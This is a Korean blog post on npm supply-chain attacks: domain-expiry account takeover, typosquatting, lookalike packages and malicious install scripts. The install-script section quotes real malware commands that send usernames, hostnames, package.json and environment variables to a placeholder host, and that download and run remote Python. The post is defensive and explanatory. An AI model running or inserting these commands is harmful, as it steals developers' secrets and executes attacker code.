<!doctype html>
<html lang="ko" dir="ltr" class="blog-wrapper blog-post-page plugin-blog plugin-id-default" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.1.1">
<title data-rh="true">안전한 개발환경을 만들어보자 | Arch-Spatula의 레시피</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://arch-spatula.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://arch-spatula.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://arch-spatula.github.io/blog/2024/01/31/npm-security"><meta data-rh="true" property="og:locale" content="ko"><meta data-rh="true" name="docusaurus_locale" content="ko"><meta data-rh="true" name="docusaurus_tag" content="default"><meta data-rh="true" name="docsearch:language" content="ko"><meta data-rh="true" name="docsearch:docusaurus_tag" content="default"><meta data-rh="true" property="og:title" content="안전한 개발환경을 만들어보자 | Arch-Spatula의 레시피"><meta data-rh="true" name="description" content="개발환경의 보안을 신경써봅시다."><meta data-rh="true" property="og:description" content="개발환경의 보안을 신경써봅시다."><meta data-rh="true" property="og:type" content="article"><meta data-rh="true" property="article:published_time" content="2024-01-31T00:00:00.000Z"><meta data-rh="true" property="article:author" content="https://github.com/arch-spatula"><meta data-rh="true" property="article:tag" content="docker,보안,npm,pip"><link data-rh="true" rel="icon" href="/img/logo.svg"><link data-rh="true" rel="canonical" href="https://arch-spatula.github.io/blog/2024/01/31/npm-security"><link data-rh="true" rel="alternate" href="https://arch-spatula.github.io/blog/2024/01/31/npm-security" hreflang="ko"><link data-rh="true" rel="alternate" href="https://arch-spatula.github.io/blog/2024/01/31/npm-security" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Arch-Spatula의 레시피 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Arch-Spatula의 레시피 Atom Feed">



<link rel="alternate" type="application/rss+xml" href="/easter/rss.xml" title="Arch-Spatula의 레시피 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/easter/atom.xml" title="Arch-Spatula의 레시피 Atom Feed">
<link rel="alternate" type="application/rss+xml" href="/experience/rss.xml" title="Arch-Spatula의 레시피 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/experience/atom.xml" title="Arch-Spatula의 레시피 Atom Feed">
<link rel="alternate" type="application/rss+xml" href="/meme/rss.xml" title="Arch-Spatula의 레시피 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/meme/atom.xml" title="Arch-Spatula의 레시피 Atom Feed">













<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/styles.4798f68e.css">
<script src="/assets/js/runtime~main.e20f6d0f.js" defer="defer"></script>
<script src="/assets/js/main.2635a767.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="본문으로 건너뛰기"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">본문으로 건너뛰기</a></div><nav aria-label="Main" class="navbar navbar--fixed-top navbarHideable_m1mJ"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/profile.png" alt="Arch-Spatula blog Logo" class="themedComponent_mlkZ themedComponent--light_NVdE" height="32" width="32"><img src="/img/profile.png" alt="Arch-Spatula blog Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU" height="32" width="32"></div><b class="navbar__title text--truncate">Arch-Spatula의 레시피</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/blog">블로그</a><a class="navbar__item navbar__link" href="/docs/intro">이런저런 레시피 시리즈</a><a class="navbar__item navbar__link" href="/react-cookbook/intro">리액트 Cook-Book</a><a class="navbar__item navbar__link" href="/vue/intro">뷰 Cook-Book</a><a class="navbar__item navbar__link" href="/js-ts-cookbook/intro">JS &amp; TS Cook-Book</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/arch-spatula/arch-spatula.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="어두운 모드와 밝은 모드 전환하기 (현재 밝은 모드)" aria-label="어두운 모드와 밝은 모드 전환하기 (현재 밝은 모드)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="container margin-vert--lg"><div class="row"><main class="col col--9 col--offset-1" itemscope="" itemtype="https://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="https://schema.org/BlogPosting"><meta itemprop="description" content="개발환경의 보안을 신경써봅시다."><header><h1 class="title_f1Hy" itemprop="headline">안전한 개발환경을 만들어보자</h1><div class="container_mt6G margin-vert--md"><time datetime="2024-01-31T00:00:00.000Z" itemprop="datePublished">2024년 1월 31일</time> · <!-- -->약 22분</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://github.com/arch-spatula" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://github.com/arch-spatula.png" alt="arch-spatula" itemprop="image"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://github.com/arch-spatula" target="_blank" rel="noopener noreferrer" itemprop="url"><span itemprop="name">arch-spatula</span></a></div><small class="avatar__subtitle" itemprop="description">Cook-Book 많이 만듭니다</small></div></div></div></div></header><div id="__blog-post-container" class="markdown" itemprop="articleBody"><div class="theme-admonition theme-admonition-caution admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>주의</div><div class="admonitionContent_BuS1"><p>저는 보안 전문가가 아닙니다. 취미로 주된 업무 분야(프론트엔드)가 아닌 것도 건드려보기 때문에 이 글을 쓰기 시작했습니다.</p><p>보안 조언으로 받아들이지 마시고 모든 책임은 본인에게 있습니다.</p></div></div>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="배경">배경<a href="#배경" class="hash-link" aria-label="배경에 대한 직접 링크" title="배경에 대한 직접 링크">​</a></h2>
<p>취업하고 배가 따시하기 시작하니까 저는 이제 새로운 걱정이 생겼습니다. 보안입니다.</p>
<p>공부 혹은 취미로 코딩하는데 언제든지 멀웨어가 설치될 수 있습니다. github 돌아다니면서 재미있어 보이면 설치해봅니다. 그 과정에 언제든이 멀웨어가 설치될 수 있습니다.</p>
<iframe class="codepen" src="https://www.youtube.com/embed/DjfpcmK62ew" title="지금! 🚨 개발자라면 무조건 알아야하는 NPM 해킹" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"></iframe>
<p>보통 많이 거르고(take with a grain of salt) 보는 테크 유튜버입니다. 하지만 위 영상을 보고 경각심을 갖게 되었습니다. pnpm, yarn으로 설치를 많이하는데 node_modules 폴더 내에 다양한 멜웨어들이 도사릴 것입니다. <del>저도 그런 공격을 시도해볼 것 같  습니다.</del></p>
<p>먼저 방어를 하려면 공격의 경로를 파악해야 합니다. npm 보안과 관련된 자료는 노마드 코더만 알려준 내용만 있을 것은 아닙니다. 몇가지 안일한 생각은 큰 규모의 오픈소스라면 별 문제가 없을 것이라고 착각합니다. 절대 아닙니다. 초기에 PR을 대충 PASS 시키는 경우도 많을 수 있고 코어 메인테이너가 그냥 넘어갈지도 모릅니다. 아직 발견한 증거는 없습니다.</p>
<p>위 영상을 보면서 생겨난 의문들과 대응 방안들을 찾고자 이 글을 쓰기 시작했습니다. 또 npm에 docker 설정한다는 언제 알려줄지도 모릅니다. 마냥 기다리기는 싫어서 제가 다루고 싶어졌습니다. 또 위 영상에서만 알려준 조언은 한계가 많습니다.</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="공급망-공격">공급망 공격<a href="#공급망-공격" class="hash-link" aria-label="공급망 공격에 대한 직접 링크" title="공급망 공격에 대한 직접 링크">​</a></h2>
<p>노마드 코더가 다루고 알려준 것이지만 다시 언급하겠습니다.</p>
<blockquote>
<p>공격자가 기업(개발자)의 소프트웨어 설치 및 업데이트 배포 과정에 침입해 정상 소프트웨어인 것처럼 꾸민 악성 소프트웨어를 사용자 기기에 설치하는 방식</p>
<p>- 보안뉴스<sup><a href="#user-content-fn-1-84611a" id="user-content-fnref-1-84611a" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup></p>
</blockquote>
<p>공급망 공격은 패키지 생태계가 있는 모든 프로그래밍 언어는 해당합니다. 표준 라이브러리가 아닌 설치가 필요한 시점부터 모두 취약점입니다. 저 같은 <a href="https://www.urbandictionary.com/define.php?term=Soydev" target="_blank" rel="noopener noreferrer">soydev</a>는 npm, pip에 의존을 많이 하고 있는데 설치할 때마다 저의 기계가 탈취될 가능성을 만드는 것입니다.</p>
<p>어느정도 오픈소스 커뮤니티에서 알려진 라이브러리를 사용하면 피해규모를 줄일 수 있을 것이라고 많이 착각합니다. 피해자가 많으면 대응하려는 사람이 많으니까 비교적 안전할 것이고 PR에 보안문제를 만드는 것을 통과시킬 가능성은 낮겠죠? 우리는 안일합니다. 언제든지 메인테이너는 <a href="https://www.spymuseum.org/education-programs/spy-resources/language-of-espionage/#Compromised" target="_blank" rel="noopener noreferrer">변절(Compromised)</a>할 수 있습니다. <del>구글은 알리바바에게 매각당하고 개인정보 백도어를 언제 만들지 모릅니다. <a href="https://namu.wiki/w/%EC%9D%80%EB%B0%95%20%EB%AA%A8%EC%9E%90" target="_blank" rel="noopener noreferrer">알루미늄 모자</a>는 내려 놓고</del></p>
<p>공급망 공격은 모든 언어와 플랫폼에게 있습니다. 차이는 있지만 모두취약합니다. 그래서 매번 설치하기 전에 직접 확인하는 습성을 기르기 바랍니다.</p>
<p>공급망 공격을 통해 유저 기계에 접근하고 다음과 같은 취약점이 발생할 수 있습니다.</p>
<ul>
<li>이메일 유출</li>
<li>디렉토리 유출</li>
<li>환경 변수 유출</li>
<li>기계에 저장한 정보(ex: github-recovery-codes) 유출</li>
<li>keylogger 설치</li>
<li>Remote Access Trojan</li>
<li>메모리 부패</li>
</ul>
<p>제가 공포심을 유발했다면 다행입니다. 말이 통하는 사람입니다.</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="npm-account-공격">npm Account 공격<a href="#npm-account-공격" class="hash-link" aria-label="npm Account 공격에 대한 직접 링크" title="npm Account 공격에 대한 직접 링크">​</a></h3>
<ol>
<li>npm 패키지 중에서 커스텀 도메인이 만료된 계정을 찾습니다.</li>
<li>도메인을 구매합니다.</li>
<li>도메인을 활용해서 비밀번호 초기화 이메일 보내기</li>
<li>비밀번호가 초기화 된 이메일 탈 취</li>
<li>패키지를 탈취 후 멀웨어 업로드</li>
<li>사일런트 업데이트</li>
</ol>
<p>이 공격이 유효할 수 있는 이유들이 있습니다. 하나는 npm이 host 권한으로 모든 것을 실행해주기 때문입니다. <del>또 라이언 달의 실수입니다.</del> 다른 하나는 npm은 자체적으로 auth를 다루고 있기 때문입니다. 자체적으로 auth를 다룰 때 문제는 도메인의 만료 때입니다. npm은 사용자의 인증을 관리하지 사용자의 이메일을 관리하지 않습니다. 이렇게 보면 github, gitlab 같은 원격 레포서비스 이메일로 가입을 요구하는 것이 합리적으로 보입니다.</p>
<p><strong>언제든지 퍼블리셔의 계정이 탈취</strong>당할 수 있습니다. 우리는 이 취약점을 항상 기억해야 합니다. 메인테이너가 해커에게 동조할지도 모르고 관심이 없어서 PR에서 지나 쳤을 수 있습니다.</p>
<p><img decoding="async" loading="lazy" src="/assets/images/npm-pic-5ee0cf3f8337045d0c125e76e30d2f00.png" width="4064" height="2334" class="img_ev3q"></p>
<p>npm 가입 페이지입니다.</p>
<p>이메일을 google, github 같은 계정을 절대 활용하고 있지 않습니다. 최소한 이메일 인증을 지원하고 있습니다. 심지어 비밀번호 확인 <code>input</code>도 없습니다. <del>input 2개 요구하는 이유가 가입할 때 틀리는 거 방지하려는 것입니다. 이게 중요한 것은 아니구요</del></p>
<p>이런 이메일 탈취는 개인이 노력하고 MFA(Multi-Factor Authentication)를 활용 하는 방안이 있습니다. 하지만 모든 사용자가 이렇게 도입할 것이라고 장담할 수 없습니다.</p>
<p>능동적으로 취할 방어전략이 크게 없습니다. npm에 의존하고 있는 동안 항상 취약점에 열려있다고 봐야 합니다. 최소한의 패키지만 설치하고 설치 전에 베스트 프랙티스에 맞는지 확인해야 합니다. 메인테이너 팀이 코드 리뷰를 꼼꼼하게 하는 프로세스가 있는지 확인하는 것도 필요할 것입니다. 그렇게 해도 사람을 실수를 하게 될 것입니다. 또 패키지 설치에 선택지가 너무 많이 줄어들 것입니다. 나중에 node 혹은 bun에 보안 취약점을 알려 줄 수 있을 때까지 기다리는 방법은 너무 수동적입니다. 이것과 마찬가지로 npm 공급망 공격시도가 비효율적이라 공격시도를 자제하게 만는 방법도 있지만 이것도 수동적입니다. 본인이 보안과 관련해서 능력이 있다면 직접 audit하는 방법도 있을 것입니다. 현재 저는 그런 지식과 능력이 없습니다.</p>
<p>설치를 하면 node module을 확인해보고 거기에 수상한 파일이 있는지 확인해봐야 합니다. 쉘 확장자가 있는지 특이한 실행파일이 있는지 파악해야 합니다.</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="typosquatting-attack">Typosquatting Attack<a href="#typosquatting-attack" class="hash-link" aria-label="Typosquatting Attack에 대한 직접 링크" title="Typosquatting Attack에 대한 직접 링크">​</a></h3>
<p>인간의 실수를 바라고 만드는 공격입니다. 직접 타이핑을 하는 상남자들이 많은데 저같은 하남자들은 공식 홈페이지에서 코드 스니펫 클릭하고 설치합니다.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npm create vite@latest</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>위는 일반적인 vite 설치 명령입니다. 여기서 어순 오타 버전을 추가해주면 됩니다.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npm create viet .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">npm create vtie .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">npm create ivte .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">npm create ivet .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>이런 오타를 노리고 패키지를 설치하기 바라는 전략입니다. 비교적 방어 전략이 단순합니다. 저랑 같이 하남자가 되면 됩니다.</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="패키지-피싱">패키지 피싱<a href="#패키지-피싱" class="hash-link" aria-label="패키지 피싱에 대한 직접 링크" title="패키지 피싱에 대한 직접 링크">​</a></h3>
<p>노마드 코더는 Math JS로 목차를 달아 뒀는데 저는 패키지 피싱이 이라는 제목이 생각났습니다.</p>
<p>공식 라이브러리의 다른 버전인척 흉내내는 전략입니다. 접두어 접미어를 붙여서 다른 버전인 것처럼 보이려고 합니다.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">npm create vite-min .</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>예시를 들면 위와 같습니다. 접미사로 min을 붙이거나 어떤 접두어를 붙이는 것입니다. 물론 이것에 대한 방어 전략은 그냥 같은 퍼블리셔인지 확인만 하면 됩니다. 이것도 비교적 방어 적략이 단순합니다.</p>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="installation-scripts">Installation Scripts<a href="#installation-scripts" class="hash-link" aria-label="Installation Scripts에 대 한 직접 링크" title="Installation Scripts에 대한 직접 링크">​</a></h3>
<p>npm의 문제점 중 하나입니다. <code>pre-install</code>과 <code>post-install</code>을 실행합니다. 설치 작업 전후로 사용자에게 권한 체크를 요구하지 않습니다. Deno는 귀찮게 요구합니다. 랜더링 라이브러리인데 네트워크 요청을 시도하면 멀웨어가 설치된 패키지라는 것을 알 수 있습니다. 반면 npm은 그냥 모두 실행합니다.</p>
<p>이런 명령이 왜 문제가 되는가? 실제로 자바스크립트 명령만 실행하는 것이 아니기 때문입니다. 퍼블리셔는 host 권한으로 커맨드라인을 직접 제어할 수 있습니다. 이렇게 되면 문제는 npm을 통해서 설치 할 수 없던 멀웨어를 커맨드라인을 통해서 설치하게 만드는 것입니다. 물론 크로미움, 셀레니움 같은 것을 설치하도록 하는 경우도 있습니다. 이것이 원래 목적입니다. 하지만 이런 프로그램도 설치가 가능하다면 다른 것도 가능하다는 것을 알 수 있습니다. 현재는 <a href="https://docs.npmjs.com/cli/v9/using-npm/scripts#best-practices" target="_blank" rel="noopener noreferrer">npm 베스트 프랙티스</a>는 아니라고 해서 많은 라이브러리 개발자들이 기피하기 시작했습니다.</p>
<p>다음은 샌드웜이 다룬 install script 보안 취약점 예시를 소개하겠습니다.</p>
<p><a href="https://blog.sandworm.dev/dissecting-npm-malware-five-packages-and-their-evil-install-scripts" target="_blank" rel="noopener noreferrer">Dissecting Npm Malware: Five Packages And Their Evil Install Scripts</a></p>
<p><a href="https://velog.io/@superlipbalm/dissecting-npm-malware-five-packages-and-their-evil-install-scripts" target="_blank" rel="noopener noreferrer">(번역) Npm 멀웨어 해부: 다섯 가지 패키지와 악의적인 설치 스크립트</a></p>
<p>Deno가 하는 짓거리 보고 Node 팀에서도 의식하기 시작했습니다. 20 버전  부터는 실험적으로 지원을 시작했습니다. 하지만 실험적이기 때문에 본인이 알아서 하기 바랍니다.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget --quiet &quot;어떤origin/?user=$(whoami)&amp;path=$(pwd)&amp;hostname=$(hostname)&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>위 커맨드를 특정 서버에 보내도록 해서 유저의 정보를 탈추할 수 있습니다. 유저의 이름과 디렉토리 그리고 호스트를 알아내서 서버에게 데이터를 전달합니다.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nslookup $(whoami).어떤origin;nslookup $(uname --nodename).어떤origin;curl -X POST -d @package.json -H &#x27;X-BOT: nope&#x27; 어떤origin/.x773/package.json ; env &gt; /tmp/.env ; curl -X POST -d @/tmp/.env -H &#x27;X-BOT: nope&#x27; 어떤origin/.x773/env.json</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>위 커맨드는 컴퓨터의 호스트네임, <code>package.json</code>, 환경 변수를 탈취합니다.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget &#x27;어떤origin/p.py&#x27; -O ~/.vim.hint;python ~/.vim.hint</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>위는 파이썬 스크립트를 유저의 홈디렉토리에 설치합니다.</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nohup python -c &#x27;import urllib;exec urllib.urlopen(&quot;어떤origin/p.py&quot;).read()&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="클립보드에 코드 복사" title="복사" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
